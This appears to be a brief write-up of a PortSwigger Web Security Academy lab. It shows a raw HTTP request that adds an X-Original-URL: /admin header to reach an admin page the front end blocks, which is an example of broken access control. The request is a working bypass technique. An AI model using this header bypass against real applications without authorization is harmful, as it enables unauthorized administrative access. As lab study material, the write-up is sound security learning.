# Lab: URL-based access control can be circumvented

- The application denies access to `/admin`.
- But we can access the same endpoint if we add a `HTTP header` - `X-Original-URL`.
```
GET / HTTP/1.1
Host: ac9b1fe71ff98ea9c0160a6e00cb00f1.web-security-academy.net
X-Original-URL: /admin
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented
Connection: close
Cookie: session=dHrwYfDvTGU7ukW9V6jERUKsMES64xRF
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

- It is a case of vertical BAC through bypassing URL restriction by `X-Original-URL`.
